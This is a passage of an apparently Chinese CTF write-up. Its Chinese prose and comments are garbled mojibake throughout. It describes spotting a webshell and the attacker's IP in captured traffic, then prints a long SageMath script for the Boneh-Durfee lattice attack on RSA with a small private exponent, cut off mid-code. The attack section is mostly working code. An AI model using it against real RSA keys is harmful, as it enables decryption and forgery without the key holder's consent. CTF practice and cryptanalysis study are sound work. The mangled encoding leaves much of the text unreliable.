alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬ä¸‰æ­¥ï¼š** æ ¹æ®å¾ˆå¤šè¯·æ±‚å“åº”å¯¹ï¼Œå‘ç°å¾ˆå¤šéƒ½æ˜¯ 404ï¼Œ404 çš„çŠ¶æ€é•¿åº¦æ¯”è¾ƒçŸ­ï¼Œæ ¹æ® Length æ’åºï¼Œä»æœ€å¤§çš„å’Œæœ€å°çš„å¼€å§‹é€‰ï¼Œæ‰¾å‡ºä¸ä¼—ä¸åŒçš„ä¸€æ‰¹æµé‡ï¼Œå‘ç°äº†æœ¨é©¬å’Œè®¿é—®æœ¨é©¬çš„ ipï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/9ccd78a6d5c34c029ee82a85965bedb1.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬å››æ­¥ï¼š** è·Ÿè¸ªè¿™ä¸ªæµï¼Œå‘ç°äº†å±é™©çš„ payloadï¼Œç¡®å®šè¿™ä¸ªå°±æ˜¯æ”»å‡»è€…ï¼š<br><img data-src="https://i-blog.csdnimg.cn/direct/6da17fb87b4d4daebf6d6a8a81a7fe50.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wdflag&#123;39.168.5.60&#125;</span><br></pre></td></tr></table></figure><h1 id="crypto01"><a class="markdownIt-Anchor" href="#crypto01">#</a> crypto01ï¼š</h1><p>â€‹åŸé¢˜ï¼Œç›´æ¥ä¸Š https://www.cnblogs.com/mumuhhh/p/17789591.htmlï¼Œæœ‰ä¸ªè„šæœ¬ï¼Œæ”¹ä¸€ä¸‹ï¼Œå…·ä½“å‚æ•°ä¹‹åç›´æ¥ sagemath è·‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># å¦‚æœæ™¶æ ¼è¾¾åˆ°è¯¥å°ºå¯¸ï¼Œåˆ™åœæ­¢ç§»é™¤</span></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºæœ‰ç”¨çŸ¢é‡çš„ç»Ÿè®¡æ•°æ®</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå¸¦æœ‰ 0 å’Œ X çš„çŸ©é˜µ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°è¯•åˆ é™¤æ— ç”¨çš„å‘é‡</span></span><br><span class="line"><span class="comment"># ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># æˆ‘ä»¬ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å¼€å§‹ä»åé¢æ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  å¦‚æœå®ƒæ²¡æœ‰ç”¨</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># è®©æˆ‘ä»¬æ£€æŸ¥å®ƒæ˜¯å¦å½±å“å…¶ä»–å‘é‡</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># å¦‚æœå¦ä¸€ä¸ªå‘é‡å—åˆ°å½±å“ï¼š</span></span><br><span class="line">                <span class="comment"># æˆ‘ä»¬å¢åŠ è®¡æ•°</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ç­‰çº§ï¼š0</span></span><br><span class="line">            <span class="comment"># å¦‚æœæ²¡æœ‰å…¶ä»–è½½ä½“æœ€ç»ˆå—åˆ°å½±å“</span></span><br><span class="line">            <span class="comment"># æˆ‘ä»¬åˆ é™¤å®ƒ</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># ç­‰çº§ï¼š1</span></span><br><span class="line">            <span class="comment">#å¦‚æœåªæœ‰ä¸€ä¸ªå—åˆ°å½±å“ï¼Œæˆ‘ä»¬ä¼šæ£€æŸ¥</span></span><br><span class="line">            <span class="comment"># å¦‚æœå®ƒæ­£åœ¨å½±å“åˆ«çš„å‘é‡</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># å¦‚æœå®ƒå½±å“å“ªæ€•ä¸€ä¸ªå‘é‡</span></span><br><span class="line">                    <span class="comment"># æˆ‘ä»¬æ”¾å¼ƒè¿™ä¸ª</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># å¦‚æœæ²¡æœ‰å…¶ä»–å‘é‡å—åˆ°å½±å“ï¼Œåˆ™å°†å…¶åˆ é™¤ï¼Œå¹¶ä¸”</span></span><br><span class="line">                <span class="comment"># è¿™ä¸ªæœ‰ç”¨çš„å‘é‡ä¸å¤Ÿæœ‰ç”¨</span></span><br><span class="line">                <span class="comment">#ä¸æˆ‘ä»¬æ— ç”¨çš„ç›¸æ¯”</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1ï¼Œ-1 å¦‚æœ &quot;strict=true&quot;ï¼Œå¹¶ä¸”è¡Œåˆ—å¼ä¸å—çº¦æŸ</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> åœ¨ä»¥ä¸‹æƒ…å†µä¸‹æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼š</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">æ¯å½“ delta &lt; 1 - sqrtï¼ˆ2ï¼‰/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#å¤šé¡¹å¼ç¯</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-ç§»ä½</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å•é¡¹å¼ x ç§»ä½åˆ—è¡¨</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#å¯¹äºå¤šé¡¹å¼ä¸­çš„å•é¡¹å¼ã€‚å•é¡¹å¼ï¼ˆï¼‰ï¼š</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># å¦‚æœå•é¡¹ä¸åœ¨å•é¡¹ä¸­</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-ç§»ä½</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å•é¡¹å¼ y ç§»ä½åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ„é€ æ ¼ B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#çº¦åŒ–æ ¼çš„åŸå‹</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #è‡ªåŠ¨åˆ é™¤</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># é‡ç½®ç»´åº¦</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ£€æŸ¥å‘é‡æ˜¯å¦æœ‰å¸®åŠ©</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ£€æŸ¥è¡Œåˆ—å¼æ˜¯å¦æ­£ç¡®ç•Œå®š</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ›¿æ¢å‘é‡ i å’Œ j -&gt;å¤šé¡¹å¼ 1 å’Œ 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;åœ¨æ ¼ä¸­å¯»æ‰¾çº¿æ€§æ— å…³å‘é‡&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># å¯¹äºi and j, æ„é€ ä¸¤ä¸ªå¤šé¡¹å¼</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ç»“æœ</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">##################################################################</span></span><br><span class="line">    <span class="comment"># éšæœºç”Ÿæˆæ•°æ®</span></span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        <span class="comment">#N = 69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721</span></span><br><span class="line">        N = <span 